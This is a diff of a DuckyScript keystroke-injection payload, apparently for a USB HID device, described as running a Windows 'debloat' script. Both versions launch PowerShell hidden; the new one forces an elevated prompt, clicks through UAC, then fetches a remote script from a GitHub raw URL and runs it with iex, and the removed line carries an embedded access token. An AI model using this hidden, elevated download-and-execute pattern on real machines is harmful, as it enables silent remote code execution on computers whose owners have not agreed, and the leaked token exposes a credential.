@@ -1,6 +1,18 @@
-REM Open PowerShell and run a script from GitHub in memory
-DELAY 1000
+
+REM open admin powershell in hidden mode 
 GUI r
 DELAY 500
-STRING powershell -NoP -W Hidden -Exec Bypass -Command "iwr -Uri https://raw.githubusercontent.com/Kiraryh/cleanup-windiws/refs/heads/main/debloat.ps1?token=GHSAT0AAAAAAC4KKKD553IHIYUZ4BCK3S5MZ3JRKGA | iex"
+STRING powershell -WindowStyle Hidden
+DELAY 500
+CONTROL-SHIFT-ENTER
+DELAY 1000
+LEFT
+ENTER
+
+REM Call the debloat.ps1 script from GitHub using iex
+STRING iex (iwr 'https://raw.githubusercontent.com/Kiraryh/cleanup-windows/refs/heads/main/debloat.ps1' -UseBasicParsing)
+ENTER
+
+REM Close PowerShell
+STRING exit
 ENTER
